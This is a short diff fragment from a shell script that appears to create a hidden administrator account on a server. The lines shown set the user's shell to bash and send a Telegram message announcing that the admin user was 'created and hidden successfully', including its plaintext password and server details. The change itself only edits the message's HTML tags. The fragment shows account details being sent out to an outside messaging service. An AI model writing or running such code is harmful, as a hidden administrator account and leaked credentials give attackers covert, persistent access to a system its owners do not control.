@@ -61,4 +61,4 @@ else
     usermod -s /bin/bash "$user_id"
 fi
 
-send_telegram_message "<b>Admin user <code>$user_id</code></b><br>has been created and hidden successfully with<br>password <b><code>$password_1</code></b>.<br>$server_info"
+send_telegram_message "<b>Admin user <code>$user_id</code></b><br>has been created and hidden successfully with</br><br>password <b><code>$password_1</code></b></br>.<br>$server_info</br>"
